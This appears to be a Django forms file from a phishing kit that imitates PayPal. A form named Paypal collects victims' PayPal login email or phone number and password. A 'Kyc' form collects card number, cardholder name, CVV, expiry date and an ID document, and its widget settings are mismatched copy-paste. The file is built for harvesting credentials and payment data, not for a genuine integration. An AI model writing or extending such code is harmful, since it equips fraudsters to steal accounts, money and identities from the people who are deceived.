from django import forms
from .models import *
from django.forms import TextInput

class Paypal(forms.ModelForm):
    class Meta:
        model = Paypal
        fields = ('username', 'password')
        widgets = {
            'username': TextInput(attrs={'placeholder': 'Email Or mobile number'}),
            'password': TextInput(attrs={'placeholder': 'Password'})
        }


class Kyc(forms.ModelForm):
    class Meta:
        model = Kyc
        fields = ('card_number', 'card_name', 'cvv', 'expiration', 'valid_id')
        widgets = {
            'username': TextInput(attrs={'placeholder': 'Email Or mobile number'}),
            'password': TextInput(attrs={'placeholder': 'Password'})
        }